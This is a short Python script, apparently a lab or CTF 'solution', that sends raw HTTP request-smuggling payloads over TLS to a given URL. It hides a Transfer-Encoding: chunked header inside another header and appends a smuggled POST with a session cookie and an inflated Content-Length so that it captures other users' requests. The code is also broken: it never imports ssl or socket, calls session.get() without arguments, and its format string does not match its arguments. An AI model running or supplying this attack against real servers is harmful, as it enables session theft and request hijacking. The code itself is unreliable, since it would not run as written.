import sys
import urllib.parse
import requests

session = requests.Session()
session.get()

def request_smuggling_attack(host, port, path):
    raw_request = (
        "POST {} HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "foo: bar\r\nTransfer-Encoding: chunked"
        "\r\n"
        "POST / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Cookie: session={my_cookie}\r\n"
        "Content-Length: 800\r\n"
        "\r\n"
        "search=x\r\n"
    ).format(path, host)

    context = ssl.create_default_context()

    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            for _ in range(2):
                ssock.sendall(raw_request.encode())
                response = ssock.recv(4096)
                print(response.decode())

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    parsed_url = urllib.parse.urlparse(url)

    host = parsed_url.hostname
    port = parsed_url.port if parsed_url.port else 443
    path = parsed_url.path if parsed_url.path else "/"

    request_smuggling_attack(host, port, path)
    request_smuggling_attack(host, port, path)
    request_smuggling_attack(host, port, path)
    request_smuggling_attack(host, port, path)

